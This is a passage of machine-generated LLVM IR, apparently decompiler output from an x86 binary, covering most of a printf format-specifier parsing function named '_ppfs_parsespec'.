  %v0_8050cf7 = phi i32 [ ptrtoint (i8** @global_var_805fd2a.711 to i32), %entry ], [ %v1_8050cf7, %dec_label_pc_8050cf7 ]
  %v1_8050cf7 = add i32 %v0_8050cf7, -2
  %v1_8050cfa = inttoptr i32 %v1_8050cf7 to i16*
  %v2_8050cfa = load i16, i16* %v1_8050cfa, align 2
  %v3_8050cfa = sext i16 %v2_8050cfa to i32
  %v12_8050cfd = icmp ne i32 %v3_8050cfa, %v0_8050cf0
  %v6_8050d07 = icmp ugt i32 %v1_8050cf7, ptrtoint (i32* @global_var_805fd12.712 to i32)
  %or.cond = and i1 %v6_8050d07, %v12_8050cfd
  br i1 %or.cond, label %dec_label_pc_8050cf7, label %dec_label_pc_8050d09

dec_label_pc_8050d09:                             ; preds = %dec_label_pc_8050cf7
  %.pre = add i32 %v0_8050cf7, -134610196
  %v2_8050d0f = sdiv i32 %.pre, 2
  store i32 %v2_8050d0f, i32* @edx, align 4
  %v1_8050d11 = add i32 %v2_8050d0f, ptrtoint (i8** @global_var_805fd2a.711 to i32)
  %v2_8050d11 = inttoptr i32 %v1_8050d11 to i8*
  %v3_8050d11 = load i8, i8* %v2_8050d11, align 1
  %v4_8050d11 = zext i8 %v3_8050d11 to i32
  ret i32 %v4_8050d11

; uselistorder directives
  uselistorder i32 %v2_8050d0f, { 1, 0 }
  uselistorder i32 %v1_8050cf7, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_805fd2a.711 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050d1a = load i32, i32* @edi, align 4
  %v0_8050d1b = load i32, i32* @esi, align 4
  %v0_8050d1c = load i32, i32* @ebx, align 4
  store i32 %v0_8050d1c, i32* %stack_var_-16, align 4
  %v4_8050d1c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_8050d48 = add i32 %tmp76, 24
  %v2_8050d48 = inttoptr i32 %v1_8050d48 to i32*
  %v3_8050d48 = load i32, i32* %v2_8050d48, align 4
  store i32 %v3_8050d48, i32* %eax.global-to-local, align 4
  %v1_8050d4f = add i32 %tmp76, 16
  %v2_8050d4f = inttoptr i32 %v1_8050d4f to i32*
  %v3_8050d4f = load i32, i32* %v2_8050d4f, align 4
  %v1_8050d52 = and i32 %v3_8050d4f, 128
  %v2_8050d52 = icmp eq i32 %v1_8050d52, 0
  store i32 %v1_8050d52, i32* %edi.global-to-local, align 4
  %v1_8050d58 = icmp eq i1 %v2_8050d52, false
  br i1 %v1_8050d58, label %dec_label_pc_8050d6b, label %dec_label_pc_8050d5a

dec_label_pc_8050d5a:                             ; preds = %entry
  %v2_8050d5a = load i32, i32* %arg1, align 4
  br label %dec_label_pc_8050db8.outer

dec_label_pc_8050d65:                             ; preds = %dec_label_pc_8050ef3
  %v1_8050d65 = add i32 %v0_8050ef3.pre.pre, 1
  store i32 %v1_8050d65, i32* @esi, align 4
  br label %dec_label_pc_8050f03

dec_label_pc_8050d6b:                             ; preds = %entry
  %v15_8050d1d = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050d6d

dec_label_pc_8050d6d:                             ; preds = %dec_label_pc_8050d95.dec_label_pc_8050d6d_crit_edge, %dec_label_pc_8050d6b
  %v2_8050d7e = phi i32 [ %v2_8050d7e.pre, %dec_label_pc_8050d95.dec_label_pc_8050d6d_crit_edge ], [ %v15_8050d1d, %dec_label_pc_8050d6b ]
  %v3_8050d7e = phi i32 [ %v1_8050d95, %dec_label_pc_8050d95.dec_label_pc_8050d6d_crit_edge ], [ 0, %dec_label_pc_8050d6b ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_8050d71 = mul i32 %v3_8050d7e, 4
  store i32 %v1_8050d71, i32* @ecx, align 4
  %v2_8050d78 = load i32, i32* %arg1, align 4
  store i32 %v2_8050d78, i32* @edx, align 4
  %v2_8050d7a = add i32 %v1_8050d71, -4
  %v3_8050d7a = add i32 %v2_8050d7a, %v2_8050d78
  %v4_8050d7a = inttoptr i32 %v3_8050d7a to i32*
  %v5_8050d7a = load i32, i32* %v4_8050d7a, align 4
  store i32 %v5_8050d7a, i32* %eax.global-to-local, align 4
  %v1_8050d7e = trunc i32 %v5_8050d7a to i8
  %v4_8050d7e = add i32 %v2_8050d7e, 36
  %v5_8050d7e = add i32 %v4_8050d7e, %v3_8050d7e
  %v6_8050d7e = inttoptr i32 %v5_8050d7e to i8*
  store i8 %v1_8050d7e, i8* %v6_8050d7e, align 1
  %v0_8050d82 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050d82 = urem i32 %v0_8050d82, 256
  %v2_8050d82 = load i32, i32* @ebx, align 4
  %v3_8050d82 = and i32 %v2_8050d82, -256
  %v4_8050d82 = or i32 %v3_8050d82, %v1_8050d82
  store i32 %v4_8050d82, i32* @ebx, align 4
  %v1_8050d84 = mul i32 %v0_8050d82, 16777216
  %v2_8050d84 = sdiv i32 %v1_8050d84, 16777216
  store i32 %v2_8050d84, i32* %eax.global-to-local, align 4
  %v1_8050d87 = load i32, i32* @edx, align 4
  %v2_8050d87 = load i32, i32* @ecx, align 4
  %v3_8050d87 = add i32 %v1_8050d87, -4
  %v4_8050d87 = add i32 %v3_8050d87, %v2_8050d87
  %v5_8050d87 = inttoptr i32 %v4_8050d87 to i32*
  %v6_8050d87 = load i32, i32* %v5_8050d87, align 4
  %v17_8050d87 = icmp eq i32 %v2_8050d84, %v6_8050d87
  %v1_8050d8b = icmp eq i1 %v17_8050d87, false
  br i1 %v1_8050d8b, label %dec_label_pc_80510d4, label %dec_label_pc_8050d91

dec_label_pc_8050d91:                             ; preds = %dec_label_pc_8050d6d
  %v3_8050d91 = trunc i32 %v0_8050d82 to i8
  %v4_8050d91 = icmp eq i8 %v3_8050d91, 0
  br i1 %v4_8050d91, label %dec_label_pc_8050d9b, label %dec_label_pc_8050d95

dec_label_pc_8050d95:                             ; preds = %dec_label_pc_8050d91
  %v0_8050d95 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050d95 = add i32 %v0_8050d95, 1
  store i32 %v1_8050d95, i32* %esi.global-to-local, align 4
  %tmp175 = icmp ult i32 %v1_8050d95, 32
  br i1 %tmp175, label %dec_label_pc_8050d95.dec_label_pc_8050d6d_crit_edge, label %dec_label_pc_8050d9b

dec_label_pc_8050d95.dec_label_pc_8050d6d_crit_edge: ; preds = %dec_label_pc_8050d95
  %v2_8050d7e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050d6d

dec_label_pc_8050d9b:                             ; preds = %dec_label_pc_8050d95, %dec_label_pc_8050d91
  %v2_8050da0 = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_8050db8.outer

dec_label_pc_8050db8.outer:                       ; preds = %dec_label_pc_8050d9b, %dec_label_pc_8050d5a, %dec_label_pc_8050ed5
  %v0_8050dc4.ph94 = phi i32 [ %v1_8050ed5, %dec_label_pc_8050ed5 ], [ %v2_8050d5a, %dec_label_pc_8050d5a ], [ %v2_8050da0, %dec_label_pc_8050d9b ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_8050ed5 ], [ %tmp66, %dec_label_pc_8050d5a ], [ %tmp66, %dec_label_pc_8050d9b ]
  %stack_var_-96.1.ph = phi i32 [ %v0_8050d5e, %dec_label_pc_8050ed5 ], [ 0, %dec_label_pc_8050d5a ], [ 0, %dec_label_pc_8050d9b ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_8050ed5 ], [ %v3_8050d48, %dec_label_pc_8050d5a ], [ %v3_8050d48, %dec_label_pc_8050d9b ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_8050ed5 ], [ 0, %dec_label_pc_8050d5a ], [ 0, %dec_label_pc_8050d9b ]
  %v7_8050dbf = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_8050dbf = trunc i64 %v7_8050dbf to i32
  %v2_8050dc7 = add i32 %v8_8050dbf, 80
  br label %dec_label_pc_8050db8

dec_label_pc_8050db8:                             ; preds = %dec_label_pc_8050db8.outer, %dec_label_pc_8050e75
  %v0_8050dc4 = phi i32 [ %v0_8050e82, %dec_label_pc_8050e75 ], [ %v0_8050dc4.ph94, %dec_label_pc_8050db8.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_8050e75 ], [ %stack_var_-32.1.ph, %dec_label_pc_8050db8.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_8050e75 ], [ %stack_var_-88.1.ph, %dec_label_pc_8050db8.outer ]
  store i32 %v0_8050dc4, i32* @edx, align 4
  store i32 %v0_8050dc4, i32* @esi, align 4
  %v1_8050dba = inttoptr i32 %v0_8050dc4 to i8*
  %v2_8050dba = load i8, i8* %v1_8050dba, align 1
  %v11_8050dba = icmp eq i8 %v2_8050dba, 42
  %v1_8050dbd = icmp eq i1 %v11_8050dba, false
  br i1 %v1_8050dbd, label %dec_label_pc_8050dcf, label %dec_label_pc_8050dbf

dec_label_pc_8050dbf:                             ; preds = %dec_label_pc_8050db8
  store i32 %v8_8050dbf, i32* %eax.global-to-local, align 4
  %v1_8050dc4 = add i32 %v0_8050dc4, 1
  store i32 %v1_8050dc4, i32* @esi, align 4
  %v0_8050dc7 = load i32, i32* @esp, align 4
  %v3_8050dc7 = add i32 %v2_8050dc7, %v0_8050dc7
  %v4_8050dc7 = inttoptr i32 %v3_8050dc7 to i32*
  store i32 0, i32* %v4_8050dc7, align 4
  %v0_8050de9.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050dcf

dec_label_pc_8050dcf:                             ; preds = %dec_label_pc_8050db8, %dec_label_pc_8050dbf
  %v0_8050de9.pre = phi i32 [ %v0_8050dc4, %dec_label_pc_8050db8 ], [ %v0_8050de9.pre.pre, %dec_label_pc_8050dbf ]
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_8050dd1 = load i32, i32* @global_var_80612cc, align 4
  store i32 %v0_8050dd1, i32* %ebp.global-to-local, align 4
  %v4_8050de9.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8050de9124 = inttoptr i32 %v0_8050de9.pre to i8*
  %v2_8050de9125 = load i8, i8* %v1_8050de9124, align 1
  %v3_8050de9126 = zext i8 %v2_8050de9125 to i32
  %v5_8050de9127 = and i32 %v4_8050de9.pre, -256
  %v6_8050de9128 = or i32 %v3_8050de9126, %v5_8050de9127
  store i32 %v6_8050de9128, i32* %eax.global-to-local, align 4
  %v2_8050deb129 = sext i8 %v2_8050de9125 to i32
  store i32 %v2_8050deb129, i32* @ecx, align 4
  %v2_8050dee130 = mul nsw i32 %v2_8050deb129, 2
  %v3_8050dee131 = add i32 %v2_8050dee130, %v0_8050dd1
  %v4_8050dee132 = inttoptr i32 %v3_8050dee131 to i8*
  %v5_8050dee133 = load i8, i8* %v4_8050dee132, align 1
  %v6_8050dee134 = and i8 %v5_8050dee133, 8
  %v7_8050dee135 = icmp eq i8 %v6_8050dee134, 0
  %v1_8050df3136 = icmp eq i1 %v7_8050dee135, false
  br i1 %v1_8050df3136, label %dec_label_pc_8050dd9, label %dec_label_pc_8050df5

dec_label_pc_8050dd9:                             ; preds = %dec_label_pc_8050dcf, %dec_label_pc_8050de8
  %v2_8050deb140 = phi i32 [ %v2_8050deb, %dec_label_pc_8050de8 ], [ %v2_8050deb129, %dec_label_pc_8050dcf ]
  %v6_8050de9139 = phi i32 [ %v6_8050de9, %dec_label_pc_8050de8 ], [ %v6_8050de9128, %dec_label_pc_8050dcf ]
  %v0_8050de8138 = phi i32 [ %v1_8050de8, %dec_label_pc_8050de8 ], [ %v0_8050de9.pre, %dec_label_pc_8050dcf ]
  %v1_8050de1137 = phi i32 [ %v0_8050e0332, %dec_label_pc_8050de8 ], [ 0, %dec_label_pc_8050dcf ]
  %v1_8050dd9 = add i32 %v1_8050de1137, -4094
  %v6_8050dd9 = sub i32 4093, %v1_8050de1137
  %v7_8050dd9 = and i32 %v6_8050dd9, %v1_8050de1137
  %v8_8050dd9 = icmp slt i32 %v7_8050dd9, 0
  %v9_8050dd9 = icmp eq i32 %v1_8050dd9, 0
  %v10_8050dd9 = icmp slt i32 %v1_8050dd9, 0
  %v3_8050ddf = icmp eq i1 %v10_8050dd9, %v8_8050dd9
  %v4_8050ddf = icmp eq i1 %v9_8050dd9, false
  %v5_8050ddf = and i1 %v4_8050ddf, %v3_8050ddf
  br i1 %v5_8050ddf, label %dec_label_pc_8050de8, label %dec_label_pc_8050de1

dec_label_pc_8050de1:                             ; preds = %dec_label_pc_8050dd9
  %v3_8050de1 = mul i32 %v1_8050de1137, 10
  store i32 %v3_8050de1, i32* %eax.global-to-local, align 4
  %v2_8050de4 = add i32 %v3_8050de1, -48
  %v3_8050de4 = add i32 %v2_8050de4, %v2_8050deb140
  store i32 %v3_8050de4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050de8

dec_label_pc_8050de8:                             ; preds = %dec_label_pc_8050dd9, %dec_label_pc_8050de1
  %v0_8050e0332 = phi i32 [ %v1_8050de1137, %dec_label_pc_8050dd9 ], [ %v3_8050de4, %dec_label_pc_8050de1 ]
  %v4_8050de928 = phi i32 [ %v6_8050de9139, %dec_label_pc_8050dd9 ], [ %v3_8050de1, %dec_label_pc_8050de1 ]
  %v1_8050de8 = add i32 %v0_8050de8138, 1
  store i32 %v1_8050de8, i32* @esi, align 4
  %v1_8050de9 = inttoptr i32 %v1_8050de8 to i8*
  %v2_8050de9 = load i8, i8* %v1_8050de9, align 1
  %v3_8050de9 = zext i8 %v2_8050de9 to i32
  %v5_8050de9 = and i32 %v4_8050de928, -256
  %v6_8050de9 = or i32 %v3_8050de9, %v5_8050de9
  store i32 %v6_8050de9, i32* %eax.global-to-local, align 4
  %v2_8050deb = sext i8 %v2_8050de9 to i32
  store i32 %v2_8050deb, i32* @ecx, align 4
  %v2_8050dee = mul nsw i32 %v2_8050deb, 2
  %v3_8050dee = add i32 %v2_8050dee, %v0_8050dd1
  %v4_8050dee = inttoptr i32 %v3_8050dee to i8*
  %v5_8050dee = load i8, i8* %v4_8050dee, align 1
  %v6_8050dee = and i8 %v5_8050dee, 8
  %v7_8050dee = icmp eq i8 %v6_8050dee, 0
  %v1_8050df3 = icmp eq i1 %v7_8050dee, false
  br i1 %v1_8050df3, label %dec_label_pc_8050dd9, label %dec_label_pc_8050df5

dec_label_pc_8050df5:                             ; preds = %dec_label_pc_8050de8, %dec_label_pc_8050dcf
  %v1_8050de1.lcssa = phi i32 [ 0, %dec_label_pc_8050dcf ], [ %v0_8050e0332, %dec_label_pc_8050de8 ]
  %v0_8050de8.lcssa = phi i32 [ %v0_8050de9.pre, %dec_label_pc_8050dcf ], [ %v1_8050de8, %dec_label_pc_8050de8 ]
  %v2_8050de9.lcssa = phi i8 [ %v2_8050de9125, %dec_label_pc_8050dcf ], [ %v2_8050de9, %dec_label_pc_8050de8 ]
  %v6_8050de9.lcssa = phi i32 [ %v6_8050de9128, %dec_label_pc_8050dcf ], [ %v6_8050de9, %dec_label_pc_8050de8 ]
  %v0_8050df5 = load i32, i32* @edx, align 4
  %v1_8050df5 = add i32 %v0_8050df5, -1
  %v2_8050df5 = inttoptr i32 %v1_8050df5 to i8*
  %v3_8050df5 = load i8, i8* %v2_8050df5, align 1
  %v12_8050df5 = icmp eq i8 %v3_8050df5, 37
  %v1_8050df9 = icmp eq i1 %v12_8050df5, false
  br i1 %v1_8050df9, label %dec_label_pc_8050e8c, label %dec_label_pc_8050dff

dec_label_pc_8050dff:                             ; preds = %dec_label_pc_8050df5
  %v10_8050dff = icmp eq i8 %v2_8050de9.lcssa, 36
  %v1_8050e01 = icmp eq i1 %v10_8050dff, false
  br i1 %v1_8050e01, label %dec_label_pc_8050e33, label %dec_label_pc_8050e03

dec_label_pc_8050e03:                             ; preds = %dec_label_pc_8050dff
  %tmp89 = icmp slt i32 %v1_8050de1.lcssa, 1
  br i1 %tmp89, label %dec_label_pc_8050e33, label %dec_label_pc_8050e07

dec_label_pc_8050e07:                             ; preds = %dec_label_pc_8050e03
  %v1_8050e07 = add i32 %v0_8050de8.lcssa, 1
  store i32 %v1_8050e07, i32* @edx, align 4
  %v4_8050e0a = icmp eq i32 %stack_var_-88.1, 0
  br i1 %v4_8050e0a, label %dec_label_pc_80510d4, label %dec_label_pc_8050e15

dec_label_pc_8050e15:                             ; preds = %dec_label_pc_8050e07
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_8050e1d = sub i32 %v1_8050de1.lcssa, %stack_var_-88.1
  %v8_8050e1d = xor i32 %v1_8050de1.lcssa, %stack_var_-88.1
  %v9_8050e1d = xor i32 %v2_8050e1d, %v1_8050de1.lcssa
  %v10_8050e1d = and i32 %v9_8050e1d, %v8_8050e1d
  %v11_8050e1d = icmp slt i32 %v10_8050e1d, 0
  %v12_8050e1d = icmp eq i32 %v2_8050e1d, 0
  %v13_8050e1d = icmp slt i32 %v2_8050e1d, 0
  %v3_8050e1f = icmp ne i1 %v13_8050e1d, %v11_8050e1d
  %v4_8050e1f = or i1 %v12_8050e1d, %v3_8050e1f
  %stack_var_-88.1.v0_8050e21 = select i1 %v4_8050e1f, i32 %stack_var_-88.1, i32 %v1_8050de1.lcssa
  br label %dec_label_pc_8050e2f

dec_label_pc_8050e2f:                             ; preds = %dec_label_pc_8050e43, %dec_label_pc_8050e15, %dec_label_pc_8050e47
  %v0_8050e2f = phi i32 [ %v1_8050e07, %dec_label_pc_8050e15 ], [ %v0_8050df5, %dec_label_pc_8050e47 ], [ %v0_8050df5, %dec_label_pc_8050e43 ]
  %stack_var_-32.2 = phi i32 [ %v1_8050de1.lcssa, %dec_label_pc_8050e15 ], [ %stack_var_-32.1, %dec_label_pc_8050e47 ], [ %stack_var_-32.1, %dec_label_pc_8050e43 ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_8050e21, %dec_label_pc_8050e15 ], [ 0, %dec_label_pc_8050e47 ], [ 0, %dec_label_pc_8050e43 ]
  store i32 %v0_8050e2f, i32* @esi, align 4
  br label %dec_label_pc_8050e56

dec_label_pc_8050e33:                             ; preds = %dec_label_pc_8050e03, %dec_label_pc_8050dff
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_8050e43, label %dec_label_pc_8050e3a

dec_label_pc_8050e3a:                             ; preds = %dec_label_pc_8050e33
  %v10_8050e3a = icmp eq i8 %v2_8050de9.lcssa, 109
  br i1 %v10_8050e3a, label %dec_label_pc_8050e8c, label %dec_label_pc_80510d4

dec_label_pc_8050e43:                             ; preds = %dec_label_pc_8050e33
  %tmp176 = icmp ugt i32 %v0_8050de8.lcssa, %v0_8050df5
  br i1 %tmp176, label %dec_label_pc_8050e47, label %dec_label_pc_8050e2f

dec_label_pc_8050e47:                             ; preds = %dec_label_pc_8050e43
  %v1_8050e47 = inttoptr i32 %v0_8050df5 to i8*
  %v2_8050e47 = load i8, i8* %v1_8050e47, align 1
  %v8_8050e47 = icmp eq i8 %v2_8050e47, 48
  br i1 %v8_8050e47, label %dec_label_pc_8050e2f, label %dec_label_pc_8050e8c

dec_label_pc_8050e56:                             ; preds = %dec_label_pc_8050e67, %dec_label_pc_8050e2f
  %v0_8050e82 = phi i32 [ %v1_8050e67, %dec_label_pc_8050e67 ], [ %v0_8050e2f, %dec_label_pc_8050e2f ]
  %v4_8050e6035 = phi i32 [ %v6_8050e60, %dec_label_pc_8050e67 ], [ %v6_8050de9.lcssa, %dec_label_pc_8050e2f ]
  store i32 ptrtoint ([8 x i8]* @global_var_805fd0a.713 to i32), i32* %edx.global-to-local, align 4
  %v1_8050e63 = inttoptr i32 %v0_8050e82 to i8*
  br label %dec_label_pc_8050e60

dec_label_pc_8050e60:                             ; preds = %dec_label_pc_8050e71, %dec_label_pc_8050e56
  %v4_8050e60 = phi i32 [ %v4_8050e6035, %dec_label_pc_8050e56 ], [ %v6_8050e60, %dec_label_pc_8050e71 ]
  %v0_8050e62 = phi i32 [ ptrtoint ([8 x i8]* @global_var_805fd0a.713 to i32), %dec_label_pc_8050e56 ], [ %v1_8050e62, %dec_label_pc_8050e71 ]
  %v0_8050e71 = phi i32 [ 1, %dec_label_pc_8050e56 ], [ %v2_8050e71, %dec_label_pc_8050e71 ]
  store i32 %v0_8050e71, i32* @ecx, align 4
  %v1_8050e60 = inttoptr i32 %v0_8050e62 to i8*
  %v2_8050e60 = load i8, i8* %v1_8050e60, align 1
  %v3_8050e60 = zext i8 %v2_8050e60 to i32
  %v5_8050e60 = and i32 %v4_8050e60, -256
  %v6_8050e60 = or i32 %v3_8050e60, %v5_8050e60
  store i32 %v6_8050e60, i32* %eax.global-to-local, align 4
  %v1_8050e62 = add i32 %v0_8050e62, 1
  store i32 %v1_8050e62, i32* @edx, align 4
  %v2_8050e63 = load i8, i8* %v1_8050e63, align 1
  %v15_8050e63 = icmp eq i8 %v2_8050e63, %v2_8050e60
  %v1_8050e65 = icmp eq i1 %v15_8050e63, false
  br i1 %v1_8050e65, label %dec_label_pc_8050e6c, label %dec_label_pc_8050e67

dec_label_pc_8050e67:                             ; preds = %dec_label_pc_8050e60
  %v1_8050e67 = add i32 %v0_8050e82, 1
  store i32 %v1_8050e67, i32* @esi, align 4
  %v0_8050e68 = load i32, i32* %edi.global-to-local, align 4
  %v2_8050e68 = or i32 %v0_8050e68, %v0_8050e71
  store i32 %v2_8050e68, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050e56

dec_label_pc_8050e6c:                             ; preds = %dec_label_pc_8050e60
  %v1_8050e6c = inttoptr i32 %v1_8050e62 to i8*
  %v2_8050e6c = load i8, i8* %v1_8050e6c, align 1
  %v3_8050e6c = icmp eq i8 %v2_8050e6c, 0
  br i1 %v3_8050e6c, label %dec_label_pc_8050e75, label %dec_label_pc_8050e71

dec_label_pc_8050e71:                             ; preds = %dec_label_pc_8050e6c
  %v2_8050e71 = mul i32 %v0_8050e71, 2
  br label %dec_label_pc_8050e60

dec_label_pc_8050e75:                             ; preds = %dec_label_pc_8050e6c
  %v0_8050e75 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8050e79 = udiv i32 %v0_8050e75, 2
  %v1_8050e79.not = or i32 %v1_8050e79, -6
  %v1_8050e7e = xor i32 %v1_8050e79.not, 5
  store i32 %v1_8050e7e, i32* %eax.global-to-local, align 4
  %v2_8050e80 = and i32 %v1_8050e7e, %v0_8050e75
  store i32 %v2_8050e80, i32* %edi.global-to-local, align 4
  %v1_8050e82 = add i32 %v0_8050e82, -1
  %v2_8050e82 = inttoptr i32 %v1_8050e82 to i8*
  %v3_8050e82 = load i8, i8* %v2_8050e82, align 1
  %v12_8050e82 = icmp eq i8 %v3_8050e82, 37
  %v1_8050e86 = icmp eq i1 %v12_8050e82, false
  br i1 %v1_8050e86, label %dec_label_pc_8050db8, label %dec_label_pc_8050e8c

dec_label_pc_8050e8c:                             ; preds = %dec_label_pc_8050e47, %dec_label_pc_8050e75, %dec_label_pc_8050df5, %dec_label_pc_8050e3a
  %v0_8050eaf = phi i32 [ %v1_8050de1.lcssa, %dec_label_pc_8050e3a ], [ %v1_8050de1.lcssa, %dec_label_pc_8050e47 ], [ 0, %dec_label_pc_8050e75 ], [ %v1_8050de1.lcssa, %dec_label_pc_8050df5 ]
  %v1_8050eb8 = phi i32 [ %v0_8050de8.lcssa, %dec_label_pc_8050e3a ], [ %v0_8050de8.lcssa, %dec_label_pc_8050e47 ], [ %v0_8050e82, %dec_label_pc_8050e75 ], [ %v0_8050de8.lcssa, %dec_label_pc_8050df5 ]
  %v0_8050eb5 = phi i32 [ %v0_8050df5, %dec_label_pc_8050e3a ], [ %v0_8050df5, %dec_label_pc_8050e47 ], [ %v1_8050e62, %dec_label_pc_8050e75 ], [ %v0_8050df5, %dec_label_pc_8050df5 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_8050e3a ], [ %stack_var_-32.1, %dec_label_pc_8050e47 ], [ %stack_var_-32.2, %dec_label_pc_8050e75 ], [ %stack_var_-32.1, %dec_label_pc_8050df5 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_8050e3a ], [ 0, %dec_label_pc_8050e47 ], [ %stack_var_-88.2, %dec_label_pc_8050e75 ], [ %stack_var_-88.1, %dec_label_pc_8050df5 ]
  %v1_8050e8c = inttoptr i32 %v0_8050eb5 to i8*
  %v2_8050e8c = load i8, i8* %v1_8050e8c, align 1
  %v11_8050e8c = icmp eq i8 %v2_8050e8c, 42
  %v1_8050e8f = icmp eq i1 %v11_8050e8c, false
  br i1 %v1_8050e8f, label %dec_label_pc_8050ec5, label %dec_label_pc_8050e91

dec_label_pc_8050e91:                             ; preds = %dec_label_pc_8050e8c
  %v4_8050e91 = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_8050e91, label %dec_label_pc_8050eb5, label %dec_label_pc_8050e98

dec_label_pc_8050e98:                             ; preds = %dec_label_pc_8050e91
  %v1_8050e98 = inttoptr i32 %v1_8050eb8 to i8*
  %v2_8050e98 = load i8, i8* %v1_8050e98, align 1
  %v11_8050e98 = icmp eq i8 %v2_8050e98, 36
  %v1_8050e9b = icmp eq i1 %v11_8050e98, false
  br i1 %v1_8050e9b, label %dec_label_pc_80510d4, label %dec_label_pc_8050ea1

dec_label_pc_8050ea1:                             ; preds = %dec_label_pc_8050e98
  %tmp91 = icmp slt i32 %v0_8050eaf, 1
  br i1 %tmp91, label %dec_label_pc_80510d4, label %dec_label_pc_8050ea9

dec_label_pc_8050ea9:                             ; preds = %dec_label_pc_8050ea1
  store i32 %v8_8050dbf, i32* %eax.global-to-local, align 4
  %v1_8050eae = add i32 %v1_8050eb8, 1
  store i32 %v1_8050eae, i32* @esi, align 4
  %v1_8050eaf = load i32, i32* @esp, align 4
  %v3_8050eaf = add i32 %v8_8050dbf, 68
  %v4_8050eaf = add i32 %v3_8050eaf, %v1_8050eaf
  %v5_8050eaf = inttoptr i32 %v4_8050eaf to i32*
  store i32 %v0_8050eaf, i32* %v5_8050eaf, align 4
  %v0_8050ef3.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050ec0

dec_label_pc_8050eb5:                             ; preds = %dec_label_pc_8050e91
  %v1_8050eb5 = add i32 %v0_8050eb5, 1
  store i32 %v1_8050eb5, i32* %eax.global-to-local, align 4
  %v12_8050eb8 = icmp eq i32 %v1_8050eb5, %v1_8050eb8
  %v1_8050eba = icmp eq i1 %v12_8050eb8, false
  br i1 %v1_8050eba, label %dec_label_pc_80510d4, label %dec_label_pc_8050ec0

dec_label_pc_8050ec0:                             ; preds = %dec_label_pc_8050eb5, %dec_label_pc_8050ea9
  %v0_8050ef3.pre.pre.pre = phi i32 [ %v1_8050eb8, %dec_label_pc_8050eb5 ], [ %v0_8050ef3.pre.pre.pre.pre, %dec_label_pc_8050ea9 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050ec5

dec_label_pc_8050ec5:                             ; preds = %dec_label_pc_8050e8c, %dec_label_pc_8050ec0
  %v0_8050ef3.pre.pre = phi i32 [ %v1_8050eb8, %dec_label_pc_8050e8c ], [ %v0_8050ef3.pre.pre.pre, %dec_label_pc_8050ec0 ]
  %v0_8050d5e = phi i32 [ %v0_8050eaf, %dec_label_pc_8050e8c ], [ -2147483648, %dec_label_pc_8050ec0 ]
  %v4_8050ec5 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_8050ec5 = icmp eq i32 %v4_8050ec5, 0
  %v1_8050eca = icmp eq i1 %v5_8050ec5, false
  %.pre = inttoptr i32 %v0_8050ef3.pre.pre to i8*
  br i1 %v1_8050eca, label %dec_label_pc_8050eee, label %dec_label_pc_8050ed0

dec_label_pc_8050ed0:                             ; preds = %dec_label_pc_8050ec5
  %v2_8050ed0 = load i8, i8* %.pre, align 1
  %v11_8050ed0 = icmp eq i8 %v2_8050ed0, 46
  %v1_8050ed3 = icmp eq i1 %v11_8050ed0, false
  br i1 %v1_8050ed3, label %dec_label_pc_8050ee7, label %dec_label_pc_8050ed5

dec_label_pc_8050ed5:                             ; preds = %dec_label_pc_8050ed0
  %v1_8050ed5 = add i32 %v0_8050ef3.pre.pre, 1
  store i32 %v1_8050ed5, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050db8.outer

dec_label_pc_8050ee7:                             ; preds = %dec_label_pc_8050ed0
  br label %dec_label_pc_8050eee

dec_label_pc_8050eee:                             ; preds = %dec_label_pc_8050ec5, %dec_label_pc_8050ee7
  %stack_var_-96.2 = phi i32 [ %v0_8050d5e, %dec_label_pc_8050ee7 ], [ %stack_var_-96.1.ph, %dec_label_pc_8050ec5 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_8050ee7 ], [ %v0_8050d5e, %dec_label_pc_8050ec5 ]
